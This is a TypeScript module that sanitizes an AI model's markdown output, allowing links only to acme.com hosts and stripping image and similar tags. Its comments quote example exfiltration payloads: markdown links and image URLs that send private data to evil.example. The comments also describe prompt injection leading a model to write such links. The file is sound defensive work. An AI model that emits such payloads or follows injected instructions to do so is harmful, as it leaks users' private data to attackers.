import { marked } from "marked";
import DOMPurify from "isomorphic-dompurify";

const ALLOWED_LINK_HOSTS = new Set(["acme.com", "docs.acme.com"]);

// Links may only point at our own sites. An injected prompt can make the model
// write [click](https://evil.example/?d=<private data>) to leak data.
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName !== "A") return;
  try {
    const url = new URL(node.getAttribute("href") ?? "");
    if (url.protocol !== "https:" || !ALLOWED_LINK_HOSTS.has(url.hostname)) node.removeAttribute("href");
  } catch {
    node.removeAttribute("href");
  }
});

// Model output is untrusted, like any user content.
export function renderModelMarkdown(md: string): string {
  const html = marked.parse(md, { async: false });
  return DOMPurify.sanitize(html, {
    // <img> is forbidden because the browser loads image URLs with no click:
    // ![x](https://evil.example/log?d=SECRET) is a zero-click exfiltration channel.
    FORBID_TAGS: ["img", "iframe", "form", "style", "svg"],
  });
}

